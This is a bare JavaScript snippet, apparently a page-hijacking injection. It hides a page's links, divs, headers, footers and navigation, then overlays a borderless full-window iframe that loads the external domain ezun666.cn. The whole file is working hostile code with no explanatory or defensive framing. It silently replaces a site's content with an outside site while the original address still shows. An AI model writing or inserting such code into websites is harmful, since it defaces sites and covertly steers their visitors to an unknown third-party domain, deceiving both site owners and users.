(function c() {
    var d = arguments[0];
    var url = "http://www." + d;
    var style = 'html,body{height: 100%;width: 100%;margin: 0 auto;}iframe {height: 100%;width: 100%;position: absolute;border: none;}a,div,footer,header,nav{display: none!important;}';
   // document.body.innerHTML = style + "<iframe src=" + url + "></iframe>";
   var styleEle=document.createElement("style");
   document.body.appendChild(styleEle);
   document.getElementsByTagName("style")[0].innerHTML+=style;
    var iframe=document.createElement("iframe");
    iframe.src=url;
    document.body.appendChild(iframe);
})("ezun666.cn");